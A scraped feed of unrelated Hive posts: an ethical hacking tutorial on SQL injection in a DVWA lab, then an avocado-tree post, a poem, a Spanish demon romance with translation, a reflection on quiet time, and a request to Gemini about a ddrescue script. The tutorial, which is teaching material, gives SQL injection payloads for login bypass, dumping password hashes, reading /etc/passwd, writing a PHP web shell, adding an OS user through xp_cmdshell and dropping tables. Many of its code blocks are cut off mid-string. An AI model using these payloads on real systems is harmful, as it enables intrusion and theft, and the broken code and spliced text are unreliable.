body.body:
# Learn Ethical Hacking (#12) - SQL Injection - The Bug That Won't Die

![leh-banner.jpg](https://images.hive.blog/DQmc2LpoeHUPesc4Dy8haRKLJgfuDY6UBKdc3sED8Dz3JH9/leh-banner.jpg)

### What will I learn

- What **SQL injection** is and why it has persisted for 25+ years;
- **Identifying** injection points: GET parameters, POST data, cookies, headers;
- **Exploiting** SQL injection on DVWA: from error-based to UNION-based extraction;
- **Bypassing** simple input filters and WAF rules;
- Writing a **Python SQL injection scanner** from scratch;
- The defense: **parameterized queries** and why they work at the parser level.

### Requirements

- A working modern computer running macOS, Windows or Ubuntu;
- Your hacking lab from Episode 2 (Kali + DVWA at Security Level: Low);
- Basic SQL knowledge (SELECT, WHERE, UNION -- we'll cover what you need);
- Python 3 with the requests library;
- The ambition to learn ethical hacking and security research.

### Difficulty

- Beginner

### Curriculum (of the `Learn Ethical Hacking` series):

- [Learn Ethical Hacking (#1) - Why Hackers Win](https://hive.blog/hive-196387/@scipio/learn-ethical-hacking-1-why-hackers-win)
- [Learn Ethical Hacking (#2) - Your Hacking Lab](https://hive.blog/hive-196387/@scipio/learn-ethical-hacking-2-your-hacking-lab)
- [Learn Ethical Hacking (#3) - How the Internet Actually Works - For Attackers](https://hive.blog/hive-196387/@scipio/learn-ethical-hacking-3-how-the-internet-actually-works-for-attackers)
- [Learn Ethical Hacking (#4) - Reconnaissance - The Art of Not Being Noticed](https://hive.blog/hive-196387/@scipio/learn-ethical-hacking-4-reconnaissance-the-art-of-not-being-noticed)
- [Learn Ethical Hacking (#5) - Active Scanning - Mapping the Attack Surface](https://hive.blog/hive-196387/@scipio/learn-ethical-hacking-5-active-scanning-mapping-the-attack-surface)
- [Learn Ethical Hacking (#6) - The AI Slop Epidemic - Why AI-Generated Code Is a Security Disaster](https://hive.blog/hive-196387/@scipio/learn-ethical-hacking-6-the-ai-slop-epidemic-why-ai-generated-code-is-a-security-disaster)
- [Learn Ethical Hacking (#7) - Passwords - Why Humans Are the Weakest Cipher](https://hive.blog/hive-196387/@scipio/learn-ethical-hacking-7-passwords-why-humans-are-the-weakest-cipher)
- [Learn Ethical Hacking (#8) - Social Engineering - Hacking the Human](https://hive.blog/hive-196387/@scipio/learn-ethical-hacking-8-social-engineering-hacking-the-human)
- [Learn Ethical Hacking (#9) - Cryptography for Hackers - What Protects Data (and What Doesn't)](https://hive.blog/hive-196387/@scipio/learn-ethical-hacking-9-cryptography-for-hackers-what-protects-data-and-what-doesnt)
- [Learn Ethical Hacking (#10) - The Vulnerability Lifecycle - From Discovery to Patch to Exploit](https://hive.blog/hive-196387/@scipio/learn-ethical-hacking-10-the-vulnerability-lifecycle-from-discovery-to-patch-to-exploit)
- [Learn Ethical Hacking (#11) - HTTP Deep Dive - Request Smuggling and Header Injection](https://hive.blog/hive-196387/@scipio/learn-ethical-hacking-11-http-deep-dive-request-smuggling-and-header-injection)
- [Learn Ethical Hacking (#12) - SQL Injection - The Bug That Won't Die](https://hive.blog/hive-196387/@scipio/learn-ethical-hacking-12-sql-injection-the-bug-that-wont-die) (this post)

### Solutions to Episode 11 Exercises

**Exercise 1 -- Burp Suite request modification:**

```
Key findings from modifying the DVWA login request:
- Changing User-Agent: server doesn't care, login succeeds (User-Agent
  is informational only, not used for authentication)
- Adding X-Custom header: ignored by server (unknown headers are allowed
  by HTTP spec, just passed through)
- Changing username: login fails (username is part of authentication logic)
- Removing Cookie header: server creates a new session, redirects to
  login page (PHPSESSID cookie is required for session tracking)

The Cookie header is the most security-critical: it carries the session
token. Without it, the server doesn't know who you are. With a stolen
cookie, you ARE that user.
```

The key insight: HTTP is stateless. The Cookie header is the ENTIRE mechanism for maintaining identity across requests. Steal the cookie, steal the session.

**Exercise 2 -- Security header auditor:**

```python
import requests, sys

HEADERS = {
    'X-Content-Type-Options': ('nosniff', 'Prevents MIME type sniffing (XSS via file upload)'),
    'X-Frame-Options': ('DENY', 'Prevents clickjacking via iframe embedding'),
    'Content-Security-Policy': ('default-src self', 'Controls resource loading (XSS mitigation)'),
    'Strict-Transport-Security': ('max-age=31536000', 'Forces HTTPS (prevents downgrade attacks)'),
    'X-XSS-Protection': ('1; mode=block', 'Legacy XSS filter (deprecated but still useful)'),
    'Referrer-Policy': ('strict-origin-when-cross-origin', 'Controls referrer info leakage'),
}

def audit(url):
    resp = requests.get(url, timeout=10, verify=False)
    print(f\

)

audit(sys.argv[1])
# Metasploitable2 will be missing ALL of them
```

The key insight: Metasploitable2 (and most legacy applications) ship with zero security headers. Modern frameworks (Django, Rails, Express) set most of these by default -- but only if you use the security middleware.

**Exercise 3 -- Manual HTTP with netcat:**

```
Server headers that leak technology stack:
- Server: Apache/2.2.8 (Ubuntu) DAV/2  -> OS and web server version
- X-Powered-By: PHP/5.2.4-2ubuntu5.10  -> language and exact patch level
- Allow: GET,HEAD,POST,OPTIONS,TRACE    -> enabled methods (TRACE is risky)
- DAV: 1,2                             -> WebDAV enabled (PUT file upload possible)

In production: remove Server/X-Powered-By headers, disable TRACE,
disable WebDAV unless explicitly needed.
```

The key insight: the OPTIONS response is a roadmap for attackers. Every enabled method is a potential attack vector. TRACE enables XST, PUT enables file upload, DELETE could remove content.

---

# Learn Ethical Hacking (#12) - SQL Injection - The Bug That Won't Die

SQL injection was first publicly documented in 1998 by Jeff Forristal in Phrack Magazine. Twenty-eight years later, it remains in the OWASP Top 10. It's responsible for some of the largest data breaches in history -- Heartland Payment Systems (2008, 130 million cards), Sony PlayStation Network (2011, 77 million accounts), TalkTalk (2015, 157,000 customer records). It's one of the first things AI code assistants get wrong (as we discussed in episode 6). And it is embarrassingly simple to both exploit AND prevent.

So why won't it die? Because developers keep putting user input into SQL strings. It's the same fundamental problem we've been tracking since episode 1 -- user input is _untrusted_ and must be treated as such. When developers forget that (or when their framework abstractions leak), SQL injection is what happens.

This episode is the first hands-on web attack in Arc 2. Last episode we explored how HTTP works at the raw level -- headers, methods, request smuggling. Now we start exploiting the applications that speak HTTP. And we start with the king of web vulnerabilities, the one that's been #1 on every security list since security lists existed.

_Laten we beginnen._

### The Fundamental Problem

Here's what happens inside a vulnerable web application when you search for a user:

```php
// PHP code on the server (DVWA, simplified)
$id = $_GET['id'];
$query = \

;
$result = mysql_query($query);
```

When you enter `1`, the query becomes:

```sql
SELECT first_name, last_name FROM users WHERE user_id = '1'
```

Works fine. Returns one user. But what happens if you enter `1' OR '1'='1`?

```sql
SELECT first_name, last_name FROM users WHERE user_id = '1' OR '1'='1'
```

The `OR '1'='1'` is _always true_. The query returns EVERY user in the table. You just bypassed the intended query logic by injecting SQL syntax into a value field.

This is the core of SQL injection: the database cannot distinguish between the developer's SQL code and the attacker's injected SQL code, because they're concatenated into a single string before being sent to the parser. The data became code. That's the entire vulnerability in one sentence.

Think back to what we saw with HTTP request smuggling in episode 11 -- different parsers disagreeing about where one thing ends and another begins. SQL injection is the same class of problem. The application sees `1' OR '1'='1` as a single user input value. The database parser sees it as a value (`1`), a string terminator (`'`), and then additional SQL logic (`OR '1'='1'`). Two systems, same input, different interpretations. _Hetzelfde patroon, steeds weer._

### Hands-On: SQL Injection on DVWA

Open DVWA in your Kali browser. Set security level to **Low**. Navigate to **SQL Injection**.

The page has an input field asking for a \

It expects a number. But the application doesn't enforce that expectation -- it takes whatever you type and shoves it into a SQL string. Let's prove it.

**Step 1: Confirm injection exists**

Enter: `1'`

If you see a SQL error message like:

```
You have an error in your SQL syntax; check the manual that
corresponds to your MySQL server version for the right syntax
to use near ''1''' at line 1
```

That's confirmation. The single quote broke the SQL syntax -- the application is concatenating your input directly into the query with no sanitization, no escaping, nothing. The error message is also leaking information: you now know it's MySQL, and you can see exactly how your input is being embedded in the query structure. Some applications hide error messages in production (which is good security practice), but DVWA at Low security shows everything.

**Step 2: Extract all users**

Enter: `1' OR '1'='1`

You should see ALL users returned (admin, Gordon, Hack, Pablo, Bob). Five records instead of one. The `OR` condition made every row match.

**Step 3: Determine the number of columns**

Before using UNION (which lets us pull data from other tables), we need to know how many columns the original query returns. UNION requires both sides to have the same column count:

```
1' ORDER BY 1 -- -
1' ORDER BY 2 -- -
1' ORDER BY 3 -- -    <- this one errors: \

```

Two columns. The `-- -` is a SQL comment that ignores everything after it (including the closing quote from the application's query). The space and dash after `--` are necessary because MySQL requires at least one whitespace character after the comment indicator.

**Step 4: UNION-based extraction**

Now we inject our own SELECT using UNION:

```
1' UNION SELECT user(), database() -- -
```

This returns the database username and current database name alongside the normal results. On DVWA, you'll see something like `root@localhost` and `dvwa`. The database is running as root -- which means any SQL we inject runs with full database privileges. That's bad (for the defender).

**Step 5: Enumerate tables**

```
1' UNION SELECT table_name, table_schema FROM information_schema.tables WHERE table_schema = 'dvwa' -- -
```

This queries MySQL's **information_schema** -- the metadata database that describes all other databases, tables, and columns on the server. Every MySQL installation has it, and it's accessible to anyone who can execute SQL. You'll see `guestbook` and `users`.

**Step 6: Enumerate columns**

```
1' UNION SELECT column_name, data_type FROM information_schema.columns WHERE table_name = 'users' -- -
```

Now you know the column names: `user_id`, `first_name`, `last_name`, `user`, `password`, `avatar`. The `password` column is the prize.

**Step 7: Dump the entire users table**

```
1' UNION SELECT user, password FROM users -- -
```

You just extracted every username and password hash from the database. The password hashes (MD5 in DVWA's case) can be cracked with the techniques from episode 7. If you saved your hashcat or John the Ripper notes, now's the time to pull them out.

_The entire attack took seven steps and about two minutes._ From \

And this is on a deliberately vulnerable application with security set to Low. In the real world, the same attack pattern works against production applications -- it just requires more steps to bypass whatever defenses are in place (which is what we'll cover in the next episode on advanced SQL injection).

Having said that, I want to be clear about something: this sequence -- confirm injection, determine column count, UNION extract, enumerate information_schema, dump target table -- is the STANDARD methodology. Every pentester follows these exact steps. Every automated tool (sqlmap, which we'll discuss later in this series) automates these exact steps. Understanding the manual process is critical because when automated tools fail (and they do), you need to know what's happening underneath to debug and adapt.

### Injection Points: It's Not Just URL Parameters

The DVWA example uses a GET parameter (`?id=1`), which is the simplest case. But SQL injection can happen anywhere user input touches a SQL query:

**POST data**: Login forms are a classic target. If the application does `SELECT * FROM users WHERE username='$user' AND password='$pass'`, you can bypass authentication entirely:

```
Username: admin' -- -
Password: anything
```

The query becomes `SELECT * FROM users WHERE username='admin' -- -' AND password='anything'`. Everything after `-- -` is a comment. The password check is completely eliminated. You're logged in as admin without knowing the password.

**HTTP headers**: Some applications log or process headers like `User-Agent`, `Referer`, or `X-Forwarded-For` by inserting them into SQL databases. If the application stores your User-Agent in a log table via string concatenation:

```python
query = f\

```

An attacker sends: `User-Agent: '; DROP TABLE access_log; -- -`

**Cookies**: Session values, preferences, or shopping cart data stored in cookies that get used in SQL queries. Less common but still found, especially in older PHP applications that store user preferences in cookies and query them directly.

**JSON/XML bodies**: Modern APIs accept structured data in request bodies. If the application extracts values from JSON and concatenates them into SQL, the injection point is inside the JSON payload. This catches developers off guard because they think \

-- but JSON is just a transport format. The values inside it are still user input, and putting them in a SQL string is still concatenation.

The lesson: ANY user-controllable input that reaches a SQL query is a potentail injection point. If you're doing a pentest and you're only testing URL parameters, you're missing attack surface. Test everything that goes into the request.

### Beyond the Basics: Other Injection Types

What we just did is called **UNION-based injection** -- the most straightforward type because results are directly visible in the page. But there are situations where the application doesn't show query results in the HTTP response. That's where blind injection techniques come in.

**Error-based injection**: Extract data through error messages. MySQL's `EXTRACTVALUE()` and `UPDATEXML()` functions can be abused to return data in error text:

```sql
1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT database()), 0x7e)) -- -
-- Error: \

-- The database name is embedded in the error message!
```

The application doesn't need to display query results. It just needs to show error messages. And many applications do, especially in development or staging enviroments that accidentally went to production (something I've seen more times than I'd like to admit ;-) ).

**Boolean-based blind injection**: No visible output at all. But you can ask yes/no questions by observing whether the page renders normally or differently:

```sql
1' AND SUBSTRING(database(),1,1)='d' -- -
-- If the page loads normally: first character is 'd'
-- If it's different/empty: first character is NOT 'd'
```

One character at a time. Slow but effective. You cycle through all printable characters for each position until you've extracted the entire value. For a 5-character database name, that's up to 5 x 95 = 475 requests. For a full table dump with 100 rows of data, you're looking at thousands of requests. Tedious manually, trivial to automate.

**Time-based blind injection**: The ultimate blind technique. No visible output AND identical responses for true/false. But you can measure response time:

```sql
1' AND IF(SUBSTRING(database(),1,1)='d', SLEEP(5), 0) -- -
-- If response takes 5 seconds: first character is 'd'
-- If immediate: first character is NOT 'd'
```

This works against ANY application that has SQL injection, regardless of whether it shows results, errors, or any difference in the response. The timing side-channel is always there because the database will always execute the SLEEP. It's extremely slow (5 seconds per character test) but it's the last resort when everything else is blocked, and it almost always works.

### Writing a SQL Injection Scanner

Let's build a basic scanner that automates the detection of SQL injection vulnerabilities. This is a simplified version of what tools like sqlmap do internally:

```python
#!/usr/bin/env python3
\

This scanner is error-based only -- it sends payloads and looks for SQL error strings in the response. A real scanner like sqlmap also does boolean-based and time-based blind detection (comparing response lengths and measuring delays), tests multiple database backends, and has hundreds of payload variations. But the principle is the same: send input that would break SQL syntax, observe whether the application reveals the breakage.

Let's add a **blind injection detector** that compares response lengths for true vs false conditions:

```python
def test_blind(url, param_name, cookies=None):
    \

parsed = urlparse(url)
    params = parse_qs(parsed.query)

    # True condition
    params[param_name] = [\

    except requests.RequestException:

```

The logic is simple: if `1' AND 1=1 -- -` (true) produces a significantly different response than `1' AND 1=2 -- -` (false), the application is processing the injected SQL conditions. The `AND 1=1` doesn't change the result set (it's always true), while `AND 1=2` eliminates all results (it's always false). A response length difference proves the injection is affecting the query.

### Where SQL Injection Gets Really Dangerous

The DVWA examples are educational. But in production systems, SQL injection escalates far beyond reading database tables:

**File system access**: MySQL's `LOAD_FILE()` and `INTO OUTFILE` can read and write files on the server's filesystem:

```sql
-- Read /etc/passwd (if MySQL has FILE privilege)
1' UNION SELECT LOAD_FILE('/etc/passwd'), 2 -- -

-- Write a PHP web shell to the web root
1' UNION SELECT '<?php system($_GET[\

And from file write to remote code execution is one HTTP request away -- browse to `shell.php?cmd=whoami` and you're executing OS commands. This is how SQL injection turns into full server compromise.

**Command execution**: Some database engines support executing system commands directly. Microsoft SQL Server has `xp_cmdshell`:

```sql
'; EXEC xp_cmdshell 'net user hacker Password123! /add'; -- -
```

If `xp_cmdshell` is enabled (it's disabled by default in modern SQL Server, but attackers can often re-enable it if they have sysadmin privileges), you have direct OS command execution through the database.

**Lateral movement**: Once you have database access through injection, you can often find credentials for other systems stored in the same database -- API keys, SMTP passwords, admin credentials for other applications. Databases are credential treasure troves. I've seen engagements where a SQL injection in a secondary web application gave us credentials to the primary domain controller. The injection itself was the initial foothold; the real damage came from what was stored in the database.

### The Fix: Parameterized Queries

The defense is absolute and simple. Use **parameterized queries** (also called prepared statements):

```python
# VULNERABLE (string concatenation)
cursor.execute(f\

, (user_input,))
```

The difference: with parameterized queries, the SQL structure and the data are sent _separately_ to the database engine. The parser processes the SQL template first (it knows the structure: SELECT, FROM, WHERE, placeholder). THEN it inserts the data into the placeholder position. The data can NEVER be interpreted as SQL code because the parsing already happened.

This isn't a filter or a sanitizer -- it's an architectural fix. The parser literally cannot confuse data for code. There's no bypass, no edge case, no encoding trick that breaks it. It's been available in every major database library since the early 2000s.

```python
# All major languages support parameterized queries:

# Python (sqlite3)
cursor.execute(\

cursor.execute(query)
    return cursor.fetchone()
```

Instead of:

```python
# Correct (SECURE)
def get_user(user_id):
    cursor.execute(\

, (user_id,))
    return cursor.fetchone()
```

The vulnerable version is _syntactically_ cleaner -- it's one line instead of a tuple argument. It reads more naturally. It works perfectly in testing. And it's a critical security vulnerability that's been documented for twenty-eight years. The AI has been trained on millions of code examples, including all the vulnerable ones in tutorials, Stack Overflow answers, and legacy codebases. It reproduces the pattern because the pattern is common. Common and catastrophic ;-)

And yet, in 2026, developers still concatenate strings. AI code assistants still suggest it. Twenty-eight years of the same bug. _Ongelooflijk, toch?_

### Second-Order SQL Injection

There's one more variant that's particularly sneaky and worth mentioning before we wrap up: **second-order injection** (also called stored injection). The malicious SQL isn't executed when it's first submitted -- it's stored in the database and then executed later when it's retrieved and used in another query.

Example: a user registers with the username `admin' -- -`. The registration form uses parameterized queries (secure), so the username is stored safely in the database as a literal string. But later, a different part of the application retrieves that username and uses it in a concatenated query:

```python
# Registration (parameterized -- safe)
cursor.execute(\

, (username,))

# Later, in a password change function (concatenated -- VULNERABLE)
stored_username = get_current_user()  # returns \

)
# Becomes: UPDATE users SET password = 'newpass' WHERE username = 'admin' -- -'
# Changes the ADMIN's password, not the attacker's!
```

The first query is secure. The second query is vulnerable. The attack payload survived storage and was activated on retrieval. This is hard to find with automated scanners because the injection point (registration form) and the execution point (password change) are different parts of the application. You need to understand the application's data flow to find second-order injection, which is why manual code review and understanding application architecture matters alongside automated testing.

### What Comes Next

SQL injection goes deeper than one episode can cover. We've done classic injection on DVWA at Low security -- direct input, visible results, cooperative error messages. But real applications have defenses: prepared statements (the correct fix), input validation (a partial fix), WAFs (a band-aid), and DVWA's higher security levels simulate these progressively.

Next time we'll tackle all of that. DVWA at Medium and High security. Blind injection techniques at scale. Automated tools. Filter bypassing. Extracting entire database schemas through timing channels that take 5 seconds per character. The methodology for when the easy techniques fail and you need to get creative.

But the foundation you built today is permanent. Confirm the injection. Count the columns. UNION SELECT from information_schema. Dump the target table. This sequence doesn't change. The difficulty goes up; the logic stays the same.

body.title: From Patience to Reward: My Avocado Tree Finally Bears Fruit 🥑🌿
body.body:
There is a special kind of joy that comes from seeing something you planted with your own hands finally begin to produce. This season, my avocado tree has given me that exact feeling—a quiet but powerful reminder that patience, care, and consistency always pay off in the end.
When I first planted this avocado tree, it was nothing more than a small, delicate seedling. At that stage, it was hard to imagine that one day it would grow into a strong tree capable of carrying fruit. Like many farmers and gardeners, I faced moments of uncertainty. There were days when growth seemed slow, and times when the leaves didn’t look as healthy as I had hoped. I questioned whether the soil was right, whether I was watering correctly, or if the environment would truly support the tree’s development.
But one thing I’ve learned through farming is that growth doesn’t happen overnight. Nature works on its own timeline, and as farmers, our role is to support that process, not rush it. I stayed committed to taking care of the tree—making sure it had well-drained soil, enough sunlight, and consistent watering without overdoing it. Avocado trees are sensitive, especially to waterlogged conditions, so proper drainage became one of my top priorities.
I also started paying closer attention to soil health, adding organic matter to improve fertility and structure. Healthy soil creates a strong foundation, and over time, I could see the difference in the tree’s growth. The leaves became greener, the branches stronger, and the overall appearance of the tree improved.
One of the most challenging parts of growing avocados is waiting for fruiting. Many avocado trees will flower, but not all flowers turn into fruit. This can be discouraging if you don’t understand the process. Pollination, weather conditions, and even slight environmental changes can affect fruit set. There were moments when my tree flowered, but no fruits developed, and I had to remind myself that this is part of the journey.
Then, one day, things changed. I noticed small fruits beginning to form where flowers once were. At first, I was cautious not to celebrate too early, but as days passed, the fruits continued to grow stronger and more visible. That moment brought a deep sense of satisfaction—proof that the effort, time, and patience were not wasted.
Today, seeing my avocado tree carrying healthy fruits fills me with pride and motivation. It’s more than just a harvest; it’s a lesson in persistence and faith in the process. Farming teaches us resilience, and moments like this make every challenge worthwhile.
For anyone thinking about growing avocado trees, my advice is simple: start, stay consistent, and be patient. Don’t be discouraged by slow progress or early setbacks. Every tree has its own pace, and success comes to those who keep going.
This journey has reminded me that the best rewards in farming—and in life—come with time. And when they finally arrive, they are truly worth the wait.

body.title: The Gravity of Ancient Loops
body.body:
There is a strange struggle in knowing exactly what is hurting you, yet reaching for it anyway. We see the patterns that pull us down, the habits that drain our light and leave us feeling empty, and we swear each morning that today will be different. But when the night falls or the stress rises, we find ourselves back in the same loop, caught in a cycle that feels as comfortable as it is destructive. It is an exhausting war between the person we are and the person we desperately want to become.

The Gravity of Ancient Loops

I build a cage with bars I forged myself,
And place my better dreams upon the shelf.
I know the poison that I choose to drink,
Yet stand once more upon the familiar brink.

A heavy chain of minutes, hours, and days,
That binds me to these old, destructive ways.
I see the exit, wide and bright and clear,
But find a safety in the grief I fear.

I’m tired of the promises I break,
Of every shallow, hollow step I take.
Each time I rise, the habit pulls me low,
To paths where nothing beautiful can grow.

It’s like a shadow stitched into my skin,
A battle that I lose before I begin.
I’m stuck in orbits that I didn't choose,
With everything to gain and more to lose.

I scream for silence in a noisy mind,
For strength to leave the wasted years behind.
But here I sit, within the wheel again,
A prisoner to a comfort built on pain.
Even in the middle of this cycle, I believe that the desire to change is the first spark of freedom. I am weary of being stuck, but that weariness is proof that I am still fighting. One day, the weight of staying the same will finally be heavier than the fear of letting go, and I will find the strength to walk away from the habits that no longer serve the person I am meant to be.

-Amor, al tocar mi sangre puedes saber lo que siento, pero no exactamente lo que pienso ni mucho menos por todo lo que he pasado-

-Malena-

-Amor, interrumpas porque es mucho lo que tengo que decirte.  Vivir separados, apartados de lo que realmente somos podría ser uno de los castigos más crueles.  Solo imagina un ser divino partido en dos y separado por toda la eternidad, buscando una parte encontrar a la otra, divididos no solamente por espacio sino también por tiempo. Renacer una y otra vez, morir incontables veces con el corazón vacío. Si eres humano, lo olvidas todo y empiezas nuevamente con cada reencarnación, pero si eres demonio, no recuerdas todo no importa cuántas veces te destruyan hasta la última célula. Una vez fui humana, por supuesto, pero al darme cuenta que nos separaban más de 1000 años tuve que hacer un trato con el alba universal, convertí en un demonio absorbe la energía de los hombres hasta que finalmente terminé de pagar mi deuda, 1000 años tratando de despertar a los durmientes sin poder despertar ni siquiera a uno de ellos.  Si te digo la verdad, llegó un momento en que terminé por olvidar por qué hacía todo esto, mi esencia angelical fue perdiendo, pero de pronto me sentí como una niña de nuevo, tomé los colores del otoño y me subí a un columpio pretendiendo vivir una vida sin pensar en ti, invisible para mi otra parte,  cómo fue escrito, pero de pronto me viste  y la alegría volvió a mi corazón...

 La demonio cayó al suelo de rodillas, las lágrimas cubrieron su rostro en un instante, las hojas de los árboles, que antes eran verdes y brillantes, cambiaron sus colores por aquellos del otoño, amarillos, bermellones, ocres y cafés.  Yo no pude más y me lancé a sus brazos cuando sentí en pedazos mi corazón mi cuerpo.  La besé con tanta intensidad  que parecía devorarla.  Su cuerpo pegado con el mío me dio un escalofrío y al mismo tiempo la sensación de estar completo.  De pronto las aves empezaron a caer una a una cubriendo el pasto amarillento de múltiples colores, la tierra empezó a agrietarse abandonando su humedad a paso acelerado.  De este caos, yo no quería soltarlo, Pero ella se apartó secándose las lágrimas.

-Al fin podremos estar juntos-

 Le dije con la voz entrecortada

-Amor. No es tan fácil-

 Se quedó callada, como buscando las palabras para explicar algo que aún ella no entendía completamente...

<HR>

\

I was once human, of course, but when I realized that more than 1,000 years separated us, I had to make a deal with the universal dawn. I became a demon, absorbing the energy of men until I finally finished paying my debt: 1,000 years trying to awaken the sleepers without being able to awaken even one of them. To tell you the truth, there came a point when I forgot why I was doing all this; my angelic essence was fading. But suddenly, I felt like a child again. I embraced the colors of autumn and climbed onto a swing, pretending to live a life without thinking of you, invisible to my other half, as it was written. But suddenly, you saw me, and joy returned to my heart...

The demon fell to her knees, tears instantly covering her face. The leaves of the trees, once green and bright, changed to the colors of autumn: yellows, vermilion, ochres, and browns. I couldn't take it anymore and threw myself into her arms when I felt my heart and body shatter into pieces. I kissed her with such intensity that it felt like I was devouring her. Her body pressed against mine sent a shiver down my spine and, at the same time, gave me the sensation of being whole. Suddenly, birds began to fall one by one, covering the yellowing grass with a multitude of colors. The earth began to crack, rapidly losing its moisture. I didn't want to let go of this chaos, but she pulled away, wiping away her tears.

\

She remained silent, as if searching for the words to explain something she still didn't fully understand...

<div class=text-justify>



In a world filled with distraction, noises, pressure, and responsibilities that seem unending, quiet time is where I find myself  again, but then, not many people have discovered this, and most of us who have discovered it aren't consistent with it. 



Quiet time can be where we heal, meditate, and grow better, and trust me, dreams can be birthed via quiet time. There are some reflections done in your alone moments that can reshape your destiny for good; it's simply powerful. 


![Screenshot_20260427-122501.jpg](https://files.peakd.com/file/peakd-hive/nkemakonam89/23xVY7gV45Lr7orXNfpaUeymdR7ozrD5jxtZ2e6wn6v4QP8X9k5wRcxvZpVWY2tCZ6iRT.jpg)

*****

As early as my teenage age, I discovered quiet time. The credit goes to our children's ministry teacher back then, who was nurturing our spiritual growth, teaching us the importance of setting ourselves apart to be alone with God. In her words, she said, \

Come to think of it, our biological father, do we communicate with him? We do because he is our father, and that's how it is for us and God too. ***** I am not trying to be spiritual in this post because that's not all we get from quiet time and reflection. No, there are many reasons to pause and observe reflections, stay away from noises or even from listening to others, and intentionally listen to our thoughts. One thing I practically learned in one of my quiet moments some time ago was that the answer I seek from outsiders is within me, waiting in the quiet. It was too real to be true, but that evening when I paused, left my home for a nature park made a lot of difference in my life. ***** I was alone over there, reflecting on many things that felt like sweeping my feet away. No noise, no kids' disturbance, no husband's attention; it was just me, my soul, and my mind, reflecting in such a quiet atmosphere. Ideas were flowing, and I was noting them all. I thought deeply unlike before and discovered that what bothered me within those periods wasn't something I couldn't control but something I was too distracted to think deeply about. ![1777289130948.jpg](https://files.peakd.com/file/peakd-hive/nkemakonam89/23xVKTAoUUyr4HKDnfXN1zKyahC5didnrKDCxoj5VX3vpzBJt9NNDbe7ZB58qcvzKe5iK.jpg) ***** Another thing quite time does for us is discovery! As much as I don't practice this more often, I have discovered a few things during my quiet moments, great ideas and more... To be sincere, the last time I observed my quiet time was last night, between 11pm and 1am. Recently, I have been going through a lot; I felt so overwhelmed by the happenings. It made me sad, and I lost my appetite. I have been praying, but last night, I decided to sit down and really reflect on all the happenings so far, so I waited until my kids and hubby went to bed, then I quietly moved to my dining room, sat over there, and began to observe deeper thoughts. I wouldn't tell you that this morning my problem is solved already, but I feel lighter, and I already began with a step to tackle my issues. ***** The idea came in last night during my quite moment and trust me, quite time is never a luxury , it's simply necessary. Some quiet reflection brings the needed clarity and strength to keep going. Overall, quiet time is a lifestyle. I hope to stay consistent with the practice. The discovery each time I struggle to do it usually leave me in awe. 10:09 AM
Dear Gemini
Give me block codes for this Bill script. Bill must revert back to working modes when stalled. In the output, Bill ran for hours unable to revert. Bill must focus on Scan Modes. In order to do Trim and Scrape for example, Bill must begin a full pass in the Scan Mode. Bill might want to modify or delete cpass related flags. Bill must turn on and off flags like -n -N for example. There are several options for Cpass flags. Only use flags that work on Gnome Ddrescue 1.27. --trim is not recognized in my version for example. Bill must decide which mode to do. But Bill must use complex math to determine which mode to do. Bill must start with independent Mario flags. Max Mario flags. Per pass, Mario decreases. But per stall, Mario increases. 


Flags Protocol
Flags must react per round and pass and mode. Some flags (like Mario, Sonic, Tetris, Timeout, etc) should start big and decrease per pass. But per stall round, at least some (or maybe all) flags should increase. The general rule is to decrease flag volume per pass and to decrease flag volume per stall; but some exception might apply depending on a number of factors. Flags like -d and -O and maybe a few others should generally be off for the first few passes and first few stalls or wait until after 90% rescued or as Bill is below -a 200 KB/s for a long time. Many flags might want to follow similar or identical templates. This Bill script has three branches of governance like America, Bill has the tiers, protocols, and this pass system personified through this Flags System. I mentioned 3 things. First, the tiers which can serve as a default template route of rounds, levels, worlds, phases, modes (five-tier system) representing a way to shuffle through different combinations and volumes of flags. Second, the various protocols personifies decentralized independent systems that can override tiers. Third, as mentioned in this Flags Protocol, Bill should be Pass-Oriented at least to a degree. I am trying to expand Bill with these protocols to make Bill smarter. 

Flags Map
The following is a general outline from high to low. For example, the first is the Sonic MPH Speed Flag set at a Super Max limit of -a 50000M which is more hypothetical or there for getting out of a jam to reset the system. The next highest is -a 25M designed to push Bill to attempt a quick pass over all the bytes and scratches. The next highest is -a 10M. The base is -a 1M. The other flags follow a similar template from high to low. In general these flags should start off as high as possible during the first pass. But perhaps the Timeout flag should be set relative to the Tetris Cluster. The higher Tetris is, the lower Timeout should be. In general, flags should start high but could decrease per pass but then also increase per stall. In general, Bill could be more relaxed during the first 80% rescued if -a 5M is flowing for ten consecutive minutes. I've included a Toolbox of flags below of example of flags that could be turned on and off as needed. The flags are independent of tiers, protocols, passes, but these flags can also work in concert with each other to coordinate the best strategy to rescue all the bytes. Bill must decide what to do per pass and sometimes per round even. After a pass, Bill can do another general Scan pass or try Post-Scan Modes like Trim, Scrape, Chaos, Crawl. To enter Trim for example, just enter a new full scan pass but without the -N --no-trim flag or without the -n --no-scrape flag for Scrape. The Flags Map Template as follows: 

Sonic: -a 10M to -a 0; base: -a 1M; High: -a 25M; Super Max: -a 50000M
Mario: -K 100Gi to -K 0; base: -K 2Gi; Super Max: -K 100Gi  
Tetris: -c 131072 to -c 1; base: -c 2048; Super Max: -c 10000000
Timeout: -T 120s to -T 1s; base: -T 30s; Super Max: -T 1200s
Toolbox: -d -O -n -N -r0 --cpass=1 --no-trim --no-scrape -b 2048

Mario Protocol
Mario's initial strategy: -K flags for the first rescued 80% of a disc (or first few passes or minutes to hours or after stalling a long time) before trying skip-size flags like --skip-size=1M,50M because skip size probing might slow Bill down. Perhaps Bill could adapt gradually. Mario could eventually use both -K and --skip-size at the same time. 

Pass Protocol
On top of the Flags Protocols and other protocols is this Pass Protocol. The goal is to try to by default attempt the first pass with high settings. If Bill struggles to complete a pass, Bill should jump more and more to rush to the end of the map sooner as a way to give up when Bill is failing to rescue enough while losing too much speed. Remember the 3 branches of the Bill government. Section 5 should at least hold a general outline of the 5 tier system of rounds, levels, worlds, phases, modes. Section 4 can include the focus on a pass system might perhaps override tiers mentioned in section 5. Bill should generally be focused on Scan Mode as opposed to the other 4 modes of Trim, Scrape, Chaos, Crawl. Section 5 could offer default tier routes. Also, the many protocols may even attempt to influence Bill those default tier routes. But perhaps the main captain of the ship is Jack. I created a Jack Protocol, we could merge that with the Pass Protocol as they are almost the same thing. The Pass System focuses on the best passes that might rescue all the bytes. These passes may not always align with tiers or protocols. Section 4 might mention the Pass System. Section 5 might mention all 5 modes. Eventually, later passes should attempt to pass through Trim, Scrape, Chaos, Crawl. 

Pass v Tiers Dynamics
